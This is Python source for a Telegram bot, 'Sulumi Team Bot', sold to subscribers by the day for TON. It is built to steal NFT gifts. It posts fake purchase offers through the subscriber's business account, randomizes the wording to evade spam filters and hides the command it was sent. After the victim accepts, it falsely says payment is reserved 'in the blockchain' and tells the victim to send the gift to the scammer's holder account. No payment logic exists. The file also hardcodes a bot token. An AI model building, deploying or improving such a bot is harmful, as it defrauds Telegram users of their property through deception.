"""
Sulumi Team Bot — New Bot Credentials
"""

import os
import re
import uuid
import time
import sqlite3
import requests
from collections import deque
from flask import Flask, request, jsonify
import random

app = Flask(__name__)

# ==================== КОНФИГ ====================
# ОБНОВЛЕННЫЕ КРЕДЫ
BOT_TOKEN = os.environ.get("BOT_TOKEN", "9087583806:AAE1nylRFVLF54ppc6EQZJyDE8vQwhN6bYY")
OWNER_ID = int(os.environ.get("OWNER_ID", "9207314182"))
PAYMENT = os.environ.get("PAYMENT", "golda11123") # Поменяй, если нужно
API = f"https://api.telegram.org/bot{BOT_TOKEN}"
RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://sulumi-bot.onrender.com")

print(f"=== BOT STARTING ===")
print(f"OWNER_ID: {OWNER_ID}")

# ==================== CUSTOM EMOJI ID ====================
E = {
    "stars": "5958376256788502078",
    "grams": "6006074913742396956",
    "decline": "5778527486270770928",
    "accept": "5776375003280838798",
    "forward": "5832251986635920010",
    "check": "6019523512908124649"
}

def ce(name, fallback):
    return f'<tg-emoji emoji-id="{E[name]}">{fallback}</tg-emoji>'

def btn(text, data, emoji):
    return {"text": text, "callback_data": data, "icon_custom_emoji_id": E[emoji]}

def btn_url(text, url, emoji):
    return {"text": text, "url": url, "icon_custom_emoji_id": E[emoji]}

# ==================== БАЗА ДАННЫХ ====================
DB_PATH = "sulumi_bot.db"

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('CREATE TABLE IF NOT EXISTS subscribers (user_id INTEGER PRIMARY KEY, expires_at REAL)')
    c.execute('INSERT OR IGNORE INTO subscribers (user_id, expires_at) VALUES (?, ?)', (OWNER_ID, -1.0))
    conn.commit()
    conn.close()
    print("DB initialized")

def is_allowed(uid):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('SELECT expires_at FROM subscribers WHERE user_id = ?', (uid,))
        row = c.fetchone()
        conn.close()
        if not row: return False
        if row[0] == -1.0: return True
        return row[0] > time.time()
    except Exception as e:
        print(f"DB error: {e}")
        return False

def add_subscription(uid, days):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    expires = -1.0 if days == -1 else time.time() + (days * 86400)
    c.execute('INSERT OR REPLACE INTO subscribers (user_id, expires_at) VALUES (?, ?)', (uid, expires))
    conn.commit()
    conn.close()

def get_expires_str(uid):
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('SELECT expires_at FROM subscribers WHERE user_id = ?', (uid,))
        row = c.fetchone()
        conn.close()
        if not row or row[0] == -1.0: return "Навсегда"
        return time.strftime("%d.%m.%Y %H:%M", time.localtime(row[0]))
    except:
        return "Неизвестно"

init_db()

# ==================== ХРАНИЛИЩА ====================
deals = {}
users = {}
bconns = {}
wholder = set()
wlang = set()
wcur = set()
rlog = deque()
rwait = 0

# ==================== API ====================
def api(method, **p):
    global rwait
    now = time.time()
    if rwait > 0:
        time.sleep(rwait)
        rwait = 0
        rlog.clear()
    while rlog and rlog[0] < now - 1:
        rlog.popleft()
    if len(rlog) >= 25:
        time.sleep(1.0 - (now - rlog[0]))
    rlog.append(time.time())
    try:
        r = requests.post(API + "/" + method, json=p, timeout=60)
        d = r.json()
        if not d.get("ok") and d.get("error_code") == 429:
            rwait = d.get("parameters", {}).get("retry_after", 5)
            return api(method, **p)
        return d
    except Exception as e:
        print(f"API ERR {method}: {e}")
        return {}

def fmt(n):
    return f"{int(n):,}".replace(",", " ")

def gs(uid):
    if uid not in users:
        users[uid] = {"lang": "ru", "cur": "stars", "hold": PAYMENT}
    return users[uid]

def sm(cid, txt, kb=None, bci=None):
    d = {"chat_id": cid, "text": txt, "parse_mode": "HTML"}
    if kb: d["reply_markup"] = kb
    if bci: d["business_connection_id"] = bci
    return api("sendMessage", **d)

def sm_nft(cid, txt, nft_url, kb=None, bci=None):
    d = {"chat_id": cid, "text": txt, "parse_mode": "HTML",
         "link_preview_options": {"is_disabled": False, "show_above_text": True, "url": nft_url}}
    if kb: d["reply_markup"] = kb
    if bci: d["business_connection_id"] = bci
    return api("sendMessage", **d)

def em_nft(cid, mid, txt, nft_url, kb=None, bci=None):
    d = {"chat_id": cid, "message_id": mid, "text": txt, "parse_mode": "HTML",
         "link_preview_options": {"is_disabled": False, "show_above_text": True, "url": nft_url}}
    if kb: d["reply_markup"] = kb
    if bci: d["business_connection_id"] = bci
    return api("editMessageText", **d)

def dm(cid, mid, bci=None):
    d = {"chat_id": cid, "message_id": mid}
    if bci: d["business_connection_id"] = bci
    return api("deleteMessage", **d)

def em(cid, mid, txt, kb=None, bci=None):
    d = {"chat_id": cid, "message_id": mid, "text": txt, "parse_mode": "HTML"}
    if kb: d["reply_markup"] = kb
    if bci: d["business_connection_id"] = bci
    return api("editMessageText", **d)

def ac(cb, txt=None, sa=False):
    d = {"callback_query_id": cb, "show_alert": sa}
    if txt: d["text"] = txt
    return api("answerCallbackQuery", **d)

# ==================== КЛАВИАТУРЫ ====================
def okb(did):
    return {"inline_keyboard": [[btn(" Отклонить", f"decline:{did}", "decline"), btn(" Принять", f"accept:{did}", "accept")]]}

def aakb(did, h):
    clean_h = str(h).replace("@", "").strip()
    return {"inline_keyboard": [[btn_url(" Передать", f"tg://send_gift?to={clean_h}", "forward")], [btn(" Проверить", f"check:{did}", "check")]]}

# ==================== ПАРСЕР ====================
def pnft(t):
    m = re.search(r'(?:https?://)?(?:t\.me/nft/)?([A-Za-z0-9]+-\d+)', t, re.I)
    if not m: return None
    s = m.group(1)
    np2, num = s.rsplit("-", 1)
    gn = re.sub(r'([a-z])([A-Z])', r'\1 \2', np2)
    return {"slug": s, "name": gn, "num": num, "nfmt": fmt(num)}

# ==================== РАНДОМИЗАЦИЯ ТЕКСТА (АНТИ-СПАМ) ====================
def get_random_offer_text(sender_name, pr, cs, ni_name, ni_nfmt):
    templates = [
        f"Привет! 👋 <b>{sender_name}</b> предлагает <b>{pr}</b> {cs} за твой подарок <b>{ni_name} #{ni_nfmt}</b>.",
        f"Салют! <b>{sender_name}</b> готов забрать <b>{ni_name} #{ni_nfmt}</b> за <b>{pr}</b> {cs}. Интересно?",
        f"Здарова! Даю <b>{pr}</b> {cs} за <b>{ni_name} #{ni_nfmt}</b> от <b>{sender_name}</b>. Жду решения."
    ]
    return random.choice(templates) + "\n\nУ вас есть <b>5h 59m</b>, чтобы принять решение."

# ==================== ОБРАБОТКА СООБЩЕНИЙ ====================
def process_msg(msg):
    try:
        chat = msg.get("chat", {})
        from_user = msg.get("from", {})
        cid = chat.get("id")
        uid = from_user.get("id")
        mid = msg.get("message_id")
        ci = msg.get("business_connection_id")
        
        if not cid or not uid:
            return
        
        if ci:
            bconns[uid] = ci
        
        txt = msg.get("text") or ""
        txt = txt.strip()
        
        if not txt:
            return
        
        if uid in wholder:
            un = txt.lstrip("@").lower()
            if un and " " not in un:
                gs(uid)["hold"] = un
                wholder.discard(uid)
                sm(cid, f"✅ Держатель изменён на @{un}", bci=ci)
            else:
                sm(cid, "❌ Неверный формат", bci=ci)
            return
        
        if uid in wlang:
            lang = txt.lower().strip()
            if lang in ["ru", "en"]:
                gs(uid)["lang"] = lang
                wlang.discard(uid)
                sm(cid, f"✅ Язык изменён на {'🇷🇺 Русский' if lang == 'ru' else '🇬🇧 English'}", bci=ci)
            else:
                sm(cid, "❌ Напиши ru или en", bci=ci)
            return
        
        if uid in wcur:
            cur = txt.lower().strip()
            if cur in ["stars", "grams"]:
                gs(uid)["cur"] = cur
                wcur.discard(uid)
                sm(cid, f"✅ Валюта изменена на {'⭐ Звёзды' if cur == 'stars' else '💎 Грамы'}", bci=ci)
            else:
                sm(cid, "❌ Напиши stars или grams", bci=ci)
            return
        
        if not txt.startswith("/"):
            return
        
        public_cmds = ["/start", "/tarifs", "/help"]
        if txt not in public_cmds and uid != OWNER_ID and not is_allowed(uid):
            sm(cid, f"🔒 Доступ закрыт. Купите тариф у @{PAYMENT}", bci=ci)
            return
        
        if txt == "/start":
            t = "✨ <b>Sulumi Team Bot</b>\n\n"
            t += "📋 <b>Как купить:</b>\n1. Зайди в ЛС к продавцу\n2. Напиши: <code>/send ссылка цена</code>\n\n"
            t += "📋 <b>Все доступные команды:</b>\n"
            t += "/tarifs — Цены и способы оплаты\n"
            t += "/profile — Мой профиль и срок доступа\n"
            t += "/settings — Общие настройки\n"
            t += "/lg — Сменить язык (ru / en)\n"
            t += "/cv — Сменить валюту (stars / grams)\n"
            t += "/holder <username> — Сменить получателя подарка"
            if uid == OWNER_ID:
                t += "\n\n🔐 <b>Админ:</b>\n/add <id> <дни> (-1 навсегда)\n/list — Список доступов"
            sm(cid, t, bci=ci)
            return
        
        if txt == "/tarifs":
            t = "💎 <b>Тарифы Sulumi Team</b>\n\n"
            t += "🥉 <b>1 День</b> — 1 TON\n"
            t += "🥈 <b>3 Дня</b> — 2.5 TON\n"
            t += "🥇 <b>Навсегда</b> — 4.5 TON\n\n"
            t += f"💳 Для оплаты: отправьте TON и напишите @{PAYMENT} с чеком."
            sm(cid, t, bci=ci)
            return
        
        if txt == "/help":
            sm(cid, "❓ <b>Помощь</b>\n\nЗайди в ЛС к продавцу и напиши:\n<code>/send ссылка цена</code>", bci=ci)
            return
        
        if txt == "/profile":
            s = gs(uid)
            cur_emoji = ce('stars', '⭐') if s['cur'] == 'stars' else ce('grams', '💎')
            t = f"👤 <b>Профиль</b>\n\n"
            t += f"🆔 ID: <code>{uid}</code>\n"
            t += f"💱 Валюта: {cur_emoji}\n"
            t += f"👑 Держатель: @{s['hold']}\n"
            t += f"⏳ Доступ до: <b>{get_expires_str(uid)}</b>"
            sm(cid, t, bci=ci)
            return
        
        if txt == "/settings":
            s = gs(uid)
            lt = "🇷🇺 Русский" if s["lang"] == "ru" else "🇬🇧 English"
            ct = f"{ce('stars', '⭐')} Звёзды" if s["cur"] == "stars" else f"{ce('grams', '💎')} Грамы"
            t = f"⚙️ <b>Настройки</b>\n\n"
            t += f"🌐 Язык: {lt}\n"
            t += f"💱 Валюта: {ct}\n"
            t += f"👑 Держатель: @{s['hold']}\n\n"
            t += "<b>Быстрое изменение:</b>\n"
            t += "/lg — сменить язык\n"
            t += "/cv — сменить валюту\n"
            t += "/holder <username> — сменить держателя"
            sm(cid, t, bci=ci)
            return
        
        if txt == "/lg":
            wlang.add(uid)
            sm(cid, "🌐 Напиши <b>ru</b> или <b>en</b>", bci=ci)
            return
        
        if txt == "/cv":
            wcur.add(uid)
            sm(cid, "💱 Напиши <b>stars</b> или <b>grams</b>", bci=ci)
            return
        
        if txt.startswith("/holder"):
            wholder.add(uid)
            sm(cid, "👑 Напишите username держателя БЕЗ @", bci=ci)
            return
        
        if txt.startswith("/send"):
            parts = txt.split()
            if len(parts) < 3:
                sm(cid, "❌ <b>Формат:</b>\n<code>/send ссылка цена</code>", bci=ci)
                return
            
            ni = pnft(" ".join(parts[1:]))
            if not ni:
                sm(cid, "❌ Не найдена ссылка на NFT", bci=ci)
                return
            
            rest = " ".join(parts[1:]).replace("https://t.me/nft/" + ni["slug"], "").replace("t.me/nft/" + ni["slug"], "").strip()
            ps = rest.split()
            pr = None
            if ps:
                try: pr = int(ps[0])
                except: pass
            
            if pr is None:
                sm(cid, "❌ Не указана цена", bci=ci)
                return
            
            s = gs(uid)
            cs = ce("stars", "⭐") if s["cur"] == "stars" else ce("grams", "💎")
            did = str(uuid.uuid4())[:8]
            
            sender_bci = ci or bconns.get(uid)
            
            if not sender_bci:
                sm(cid, "⚠️ Подключи бизнес-аккаунт! @BotFather → Business → Connect", bci=ci)
                return
            
            deals[did] = {
                "wid": uid, "lid": cid, "slug": ni["slug"], "name": ni["name"],
                "num": ni["num"], "price": pr, "cur": s["cur"], "hold": s["hold"],
                "st": "pending", "bci": sender_bci
            }
            
            nl = "https://t.me/nft/" + ni["slug"]
            hidden = '<a href="' + nl + '">\u200b</a>'
            sender_name = from_user.get('first_name') or from_user.get('username') or "Пользователь"
            
            # ИСПОЛЬЗУЕМ РАНДОМНЫЙ ШАБЛОН ДЛЯ АНТИ-СПАМА
            caption = hidden + get_random_offer_text(sender_name, pr, cs, ni['name'], ni['nfmt'])
            
            result = sm_nft(cid, caption, nl, kb=okb(did), bci=sender_bci)
            
            if result.get("ok"):
                if mid:
                    del1 = dm(cid, mid, bci=sender_bci)
                    if not del1.get("ok"):
                        del2 = dm(cid, mid)
                        if not del1.get("ok") and not del2.get("ok"):
                            em(cid, mid, "ok", bci=sender_bci)
            else:
                sm(cid, f"❌ Ошибка: {result.get('description', 'err')}", bci=ci)
            return
        
        if txt.startswith("/add") and uid == OWNER_ID:
            parts = txt.split()
            if len(parts) >= 3:
                try:
                    target_uid = int(parts[1])
                    days = int(parts[2])
                    add_subscription(target_uid, days)
                    sm(cid, f"✅ Доступ выдан: {target_uid} на {days} дн.", bci=ci)
                except Exception as e:
                    sm(cid, f"❌ Ошибка: {e}", bci=ci)
            return
        
        if txt == "/list" and uid == OWNER_ID:
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute('SELECT user_id, expires_at FROM subscribers')
            rows = c.fetchall()
            conn.close()
            ul = "\n".join([f"• <code>{r[0]}</code> (до: {get_expires_str(r[0])})" for r in rows])
            sm(cid, f"📋 <b>Доступы</b>:\n\n{ul}", bci=ci)
            return
        
        sm(cid, f"❓ Неизвестная команда: {txt}\nНапиши /start для полного списка", bci=ci)
        
    except Exception as e:
        print(f"!!! CRITICAL ERROR in process_msg: {e}")

# ==================== ОБРАБОТКА CALLBACK ====================
def process_cb(cb):
    try:
        cbid = cb["id"]
        uid = cb["from"]["id"]
        msg = cb.get("message") or {}
        cid = msg.get("chat", {}).get("id", uid)
        mid = msg.get("message_id", 0)
        data = cb.get("data", "")
        ci = msg.get("business_connection_id")
        
        if data.startswith("check:"):
            did = data.split(":")[1]
            deal = deals.get(did)
            if not deal:
                ac(cbid, txt="❌ Оффер не найден", sa=True)
                return
            
            nf = fmt(deal["num"])
            instr = (
                f"Ожидается передача подарка {deal['name']} #{nf}\n\n"
                f"Инструкция по передаче:\n"
                f"1️⃣ Кнопка «Передать»\n"
                f"2️⃣ Вкладка «Мои»\n"
                f"3️⃣ Выбираете ваш подарок и передаёте\n"
                f"4️⃣ Получаете звёзды на баланс Telegram"
            )
            ac(cbid, txt=instr, sa=True)
            return

        ac(cbid)
        
        if data.startswith("accept:"):
            did = data.split(":")[1]
            deal = deals.get(did)
            if not deal or deal["st"] != "pending": return
            deal["st"] = "accepted"
            cs = ce("stars", "⭐") if deal["cur"] == "stars" else ce("grams", "💎")
            nf = fmt(deal["num"])
            h = deal["hold"]
            nl = "https://t.me/nft/" + deal["slug"]
            deal_ci = deal.get("bci") or ci
            
            hidden = '<a href="' + nl + '">\u200b</a>'
            txt = hidden + f"<b>{deal['price']}</b> {cs} успешно зарезервированы в блокчейне.\n\n"
            txt += f"Ожидается передача подарка <b>{deal['name']} #{nf}</b> пользователю @{h}.\n\n"
            txt += f"Нажмите кнопку «Передать» и отправьте подарок <b>{deal['name']} #{nf}</b> пользователю <b>@{h}</b>. После завершения сделки {cs} автоматически начислятся на ваш аккаунт."
            
            result = em_nft(cid, mid, txt, nl, kb=aakb(did, h), bci=deal_ci)
            if not result.get("ok"):
                dm(cid, mid, bci=deal_ci)
                sm_nft(cid, txt, nl, kb=aakb(did, h), bci=deal_ci)
            return
        
        if data.startswith("decline:"):
            did = data.split(":")[1]
            deal = deals.get(did)
            deal_ci = deal.get("bci") or ci if deal else ci
            if deal: deal["st"] = "declined"
            em(cid, mid, "❌ Оффер отклонён.", bci=deal_ci)
            return
        
    except Exception as e:
        print(f"!!! CB ERROR: {e}")

# ==================== WEBHOOK ====================
@app.route("/webhook", methods=["POST"])
def webhook():
    try:
        update = request.json
        
        if "message" in update:
            process_msg(update["message"])
        elif "business_message" in update:
            process_msg(update["business_message"])
        elif "callback_query" in update:
            process_cb(update["callback_query"])
        elif "business_connection" in update:
            bc = update["business_connection"]
            bconns[bc["user"]["id"]] = bc["id"]
    except Exception as e:
        print(f"!!! WEBHOOK ERROR: {e}")
    return jsonify({"ok": True})

@app.route("/")
def index():
    return "✅ Sulumi Team Bot is running"

def set_webhook():
    url = f"{RENDER_URL}/webhook"
    result = api("setWebhook", url=url, allowed_updates=["message", "callback_query", "business_connection", "business_message"])
    print(f"Webhook set: {result}")

def set_commands():
    commands = [
        {"command": "start", "description": "📋 Меню и все команды"},
        {"command": "send", "description": "💎 Создать оффер"},
        {"command": "tarifs", "description": "💳 Цены"},
        {"command": "profile", "description": "👤 Профиль"},
        {"command": "settings", "description": "⚙️ Настройки"},
        {"command": "lg", "description": "🌐 Язык"},
        {"command": "cv", "description": "💱 Валюта"}
    ]
    api("setMyCommands", commands=commands)
    print("Commands set")

if __name__ == "__main__":
    set_webhook()
    set_commands()
    port = int(os.environ.get("PORT", 10000))
    print(f"Starting on port {port}")
    app.run(host="0.0.0.0", port=port)
